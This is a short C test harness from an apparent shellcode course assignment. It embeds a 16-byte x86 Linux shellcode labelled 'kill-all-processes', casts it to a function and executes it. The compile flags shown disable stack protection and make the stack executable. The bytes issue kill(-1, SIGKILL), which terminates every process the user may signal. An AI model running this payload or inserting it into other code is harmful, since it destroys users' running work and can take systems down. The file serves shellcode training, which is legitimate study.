// Student ID     : SLAE-1250
// Student Name   : Jonathan "Chops" Crosby
// Assignment 6.1 : Shell Code Test File
// File Name      : kill-all-processes.c

#include<stdio.h>
#include<string.h>

//compile with: gcc kill-all-processes.c -o kill-all-processes -fno-stack-protector -z execstack

unsigned char code[] = \
"\x31\xc0\x89\xc3\xb0\x63\x2c\x3e\xb3\x01\xf7\xdb\xb1\x09\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
